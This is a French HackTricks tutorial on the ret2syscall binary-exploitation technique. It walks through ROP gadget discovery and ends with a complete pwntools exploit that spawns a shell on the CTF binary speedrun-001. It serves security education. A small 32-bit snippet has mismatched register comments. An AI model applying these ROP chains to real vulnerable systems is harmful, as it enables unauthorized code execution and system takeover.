# Ret2syscall

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

Ceci est similaire à Ret2lib, cependant, dans ce cas, nous n'appellerons pas une fonction d'une bibliothèque. Dans ce cas, tout sera préparé pour appeler le syscall `sys_execve` avec quelques arguments pour exécuter `/bin/sh`. Cette technique est généralement réalisée sur des binaires compilés statiquement, donc il peut y avoir de nombreux gadgets et instructions syscall.

Pour préparer l'appel pour le **syscall**, la configuration suivante est nécessaire :

- `rax: 59 Spécifier sys_execve`
- `rdi: ptr vers "/bin/sh" spécifier le fichier à exécuter`
- `rsi: 0 spécifier aucun argument passé`
- `rdx: 0 spécifier aucune variable d'environnement passée`

Donc, fondamentalement, il est nécessaire d'écrire la chaîne `/bin/sh` quelque part et ensuite d'effectuer le `syscall` (en étant conscient du padding nécessaire pour contrôler la pile). Pour cela, nous avons besoin d'un gadget pour écrire `/bin/sh` dans une zone connue.

> [!TIP]
> Un autre syscall intéressant à appeler est **`mprotect`** qui permettrait à un attaquant de **modifier les permissions d'une page en mémoire**. Cela peut être combiné avec [ret2shellcode](stack-shellcode.md).

## Gadgets de registre

Commençons par trouver **comment contrôler ces registres** :
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
Avec ces adresses, il est possible de **écrire le contenu dans la pile et de le charger dans les registres**.

## Écrire une chaîne

### Mémoire écrivable

Tout d'abord, vous devez trouver un endroit écrivable dans la mémoire.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### Écrire une chaîne en mémoire

Ensuite, vous devez trouver un moyen d'écrire du contenu arbitraire à cette adresse.
```bash
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
### Automatiser la chaîne ROP

La commande suivante crée une chaîne ROP complète `sys_execve` à partir d'un binaire statique lorsqu'il y a des gadgets write-what-where et des instructions syscall :
```bash
ROPgadget --binary vuln --ropchain
```
#### 32 bits
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 bits
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## Gadgets Manquants

Si vous **manquez de gadgets**, par exemple pour écrire `/bin/sh` en mémoire, vous pouvez utiliser la **technique SROP pour contrôler toutes les valeurs des registres** (y compris RIP et les registres de paramètres) depuis la pile :

{{#ref}}
srop-sigreturn-oriented-programming.md
{{#endref}}

Il peut y avoir des gadgets dans la région vDSO, qui est utilisée pour passer du mode utilisateur au mode noyau. Dans ce type de défis, une image du noyau est généralement fournie pour vider la région vDSO.

## Exemple d'Exploitation
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## Autres exemples et références

- [https://guyinatuxedo.github.io/07-bof_static/dcquals19_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof_static/dcquals19_speedrun1/index.html)
- 64 bits, pas de PIE, nx, écrire dans une mémoire un ROP pour appeler `execve` et y sauter.
- [https://guyinatuxedo.github.io/07-bof_static/bkp16_simplecalc/index.html](https://guyinatuxedo.github.io/07-bof_static/bkp16_simplecalc/index.html)
- 64 bits, nx, pas de PIE, écrire dans une mémoire un ROP pour appeler `execve` et y sauter. Pour écrire sur la pile, une fonction qui effectue des opérations mathématiques est abusée.
- [https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html](https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html)
- 64 bits, pas de PIE, nx, BF canary, écrire dans une mémoire un ROP pour appeler `execve` et y sauter.
- [https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/)
- 32 bits, pas de ASLR, utiliser vDSO pour trouver des gadgets ROP et appeler `execve`.

{{#include ../../../banners/hacktricks-training.md}}
